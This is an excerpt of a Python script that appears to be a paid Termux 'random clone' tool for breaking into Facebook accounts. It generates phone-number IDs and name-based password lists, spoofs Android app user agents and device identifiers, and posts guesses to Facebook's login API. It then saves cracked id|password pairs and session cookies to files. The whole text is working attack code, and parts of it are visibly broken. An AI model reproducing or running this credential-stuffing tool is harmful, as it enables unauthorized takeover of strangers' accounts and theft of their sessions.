...
print('\33[1;33m  Follow my facebook Group \33[1;37m')
...
for xd in range(10000):
        ...
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/536.0 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/536.0'
...
for agent in range(10000):
        ...
        g='AppleWebKit/536.0 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
...
\033[0;92m██ ████ ██ ███████ ██ ████ ██ ███████ 
\033[0;94m██  ██  ██ ██   ██ ██  ██  ██ ██   ██ 
\033[0;95m██      ██ ██   ██ ██      ██ ██   ██ \033[1;32m SAAD\033[1;37m 

 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┃ [✓] AUTHOR    : ALFE & SAAD & SADIM
 ┃ [✓] TOOL      : FILE  RABDOM CLONE
 ┃ [✓] VERSION   : 19.0 PAID
 ┃ [✓] GITHUB    : MAMA-KING
 ┃ [✓] FACEBOOK  : MAMA TERMUX HELP ZONE
 ┃ [✓] WHATSAPP  : +8801408479204
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\033[1;32m=========================================================+')
def clear():
                ...
                if x == ("zea"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\033[1;32m FILE 2   for best results  ')
                                linex()
                                print(' [1] METHOD 1\n [2] METHOD 2 ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(' Select Password Crack menu');linex();print('[1] Crack with choice password\n[2] Crack with auto password ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['2','02']:
                                        plist.append('last1234')
                                        plist.append('firstlast Bangladesh')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('FirstLast 123456')
                                        ...
                                        plist.append('last@@@')
                                        plist.append('last@##')
                                        plist.append('last 2020')
                                        plist.append('last 2000')
                                        plist.append('first 2002')
                                        plist.append('first last')
                                        plist.append('first last riyavabi')
                                        plist.append('first 2020')
                                        plist.append('first saadkhan')
                                        plist.append('first 2020')
                                        plist.append('first @@#')
                                        plist.append('first last')
                                        plist.append('firstlast123')
                                        plist.append('last1234')
                                        plist.append('first last 5757753')
                                        plist.append('first last 5757200')
                                        plist.append('last12345')
                                else:
                                        try:
                                                linex()
                                                ...
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first123 last123 firstlast Bangladesh ')
                                        linex()
...
def afg():
		user=[]
		clear()
		print('\033[1;33m BD SIM CODE : 017 ,018 ,019 , 016 \n \033[1;32m=========================================================+\n IND SIM CODE: 91625 ,91629 ,91699 ,91600\n \033[1;32m=========================================================+')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;37m example: 9999, 10000, 15000,\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m[1] Method [BD]\n[2] Method [IND]')
		linex()
		mthd = input(' Choose: ')
		clear()
		print('\033[1;37m[1] BD Clone Pass\n[2] INDIAN Clone Pass')
		linex()
		pcs = input(' [?] Select: ')
		...
		with tred(max_workers=30) as Sabir:	
			...
			print(f'\033[1;35m Use flight mode for speed up\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶']
				if pcs in ['2','02']:
					passlist = [psx,ids,'57273200','57575751','first12345','first last','first1234','firstlast','Bangladesh','@@@@####','baloch','khan','pubg','pubg1122','malik786']
				
				if mthd in ['1','01']:
					Sabir.submit(rndm,ids,passlist)
				if mthd in ['2','02']:
					Sabir.submit(rndm2,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: Muhammad ,  Naseem , Najeeb ,\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan , ahmad , Aziz \033[1;97m')
                linex()
                ...
                with tred(max_workers=30) as Sabir:
                        ...
                        print(f'\033[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MAMA•M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'mbasic.facebook.com', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"', 'sec-ch-ua-platform-version': '""', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-user': '?1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'upgrade-insecure-requests': '1', 'sec-ch-ua-mobile': '?1', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-ch-prefers-color-scheme': 'light', 'cache-control': 'max-age=0', 'accept-language': 'en-US,en;q=0.9',}
                        ...
                        if "c_user" in Sabir:
                                print('\r\r\033[1;32m [MAMA-OK] %s | %s'%(ids,pas))
                                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                print("\r\r\033[1;33m Cookie: "+coki)
                                open('/sdcard/SANI-F-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sabir:
                                if 'y' in pcp:
                                        print('\033[1;33m [MAMA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALFE-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MAMA•M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        network = random.choice(['MTN','AWcc','Etisalat','Rosan'])
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';[FBAN/FB4A;FBAV/'+fbav+';252.0.0.22.355;FBBV/'+fbbv+';191850142;FBDM/{density=3.9375,width=1440,height=2899};FBLC/en_PL;FBRV/'+fbrv+';192501019;FBCR/samsung;FBMF/Galaxy A 10;FBBD/Galaxy A 10;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/'+fbsv+';10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MAMA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;37m[MAMA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [MAMA-CP] '+ids+' | '+pas+'\033[1;91m')
                                                open('/sdcard/ALFE-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ALFE-F-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MAMA-KING-XD-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['ru_RU','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "[FBAN/FB4A;FBA" + str(random.randint(11, 77)) + str(random.randrange(9, 49)) + str(random.randint(1111111, 7777777)) + ";[FBAN/FB4A;FBA" + str(random.randint(11, 77)) + str(random.randrange(9, 49)) + str(random.randint(1111111, 7777777)) + ";[FBAN/FB4A;FBAV/247.0.0.34.92;FBBV/16789039;[FBAN/FB4A;FBAV/392.0.0.23.144;FBBV/26473249;FBDM/{density=2.5,width=720,height=1440};FBLC/ru_RU;FBRV/354343139;FBCR/MTN-CG;FBMF/realme;FBBD/realme;FBPN/com.facebook.lite;FBDV/RMX3396;FBSV/13.0.3;FBOP/13;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "ru_RU","client_country_code": "RU","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MAMA-KING-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SANI-F-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SANI-F-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;37m[MAMA-KING-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print#('\033[1;33m [W-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ALFE-F-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MAMA-KING🔥-XD-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['MTN','AWcc','Etisalat','Rosan'])  
                        ua = "[FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';[FBAN/FB4A;FBAV/'+fbav+';252.0.0.22.355;FBBV/'+fbbv+';191850142;FBDM/{density=3.9375,width=1440,height=2899};FBLC/en_PA;FBRV/'+fbrv+';192501019;FBCR/samsung;FBMF/Galaxy A 51;FBBD/Galaxy A 51;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/'+fbsv+';10;FBBK/1;FBOP/1;FBCA/arm64-v8a:]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MAMA-KING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SANI-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        prin('\r\r\033[1;33m [MAMA-KING-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALFE-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [MAMA-KING-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALFE-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
